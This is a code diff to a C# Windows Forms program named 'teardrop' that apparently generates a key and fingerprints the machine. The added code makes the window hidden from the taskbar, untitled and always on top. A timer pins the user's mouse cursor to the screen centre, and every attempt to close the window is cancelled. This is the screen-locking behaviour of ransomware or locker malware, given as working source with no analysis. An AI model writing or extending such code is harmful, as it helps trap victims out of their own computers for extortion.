@@ -9,6 +9,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -32,11 +33,28 @@ namespace teardrop
                 Properties.Settings.Default.Reload();
 
                 write("Generated key: " + Properties.Settings.Default.key);
+
             }
             else
             {
                 write("Key is: " + Properties.Settings.Default.key);
             }
+
+
+            //this.WindowState = FormWindowState.Maximized;
+            this.ShowInTaskbar = false;
+            this.Text = "";
+            this.ShowIcon = false;
+            this.TopMost = true;
+
+            timer1.Enabled = true;
+            timer1.Start();
+
+            label1.Text = Properties.Settings.Default.application_title;
+
+            panel_main.Location = new Point(this.Width / 2 - panel_main.Width / 2, this.Height / 2 - panel_main.Height / 2);
+            label1.Location = new Point(panel_main.Width / 2 - label1.Width / 2, label1.Location.Y);
+
 
             string deviceId = new DeviceIdBuilder()
                 .AddMachineName()
@@ -176,6 +194,34 @@ namespace teardrop
             }
 
             write("Done getting stuff :)");
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
+        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
+        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
+        private const int MOUSEEVENTF_LEFTUP = 0x04;
+        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
+        private const int MOUSEEVENTF_RIGHTUP = 0x10;
+
+        public void DoMouseClick()
+        {
+            uint X = (uint)Screen.PrimaryScreen.WorkingArea.Width / 2;
+            uint Y = (uint)Screen.PrimaryScreen.WorkingArea.Height / 2;
+            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, X, Y, 0, 0);
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Point screenPos = System.Windows.Forms.Cursor.Position;
+            Point leftTop = new System.Drawing.Point(Screen.PrimaryScreen.WorkingArea.Width / 2, Screen.PrimaryScreen.WorkingArea.Height / 2);
+            Cursor.Position = leftTop;
+
+            //DoMouseClick();
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
         }
     }
 }
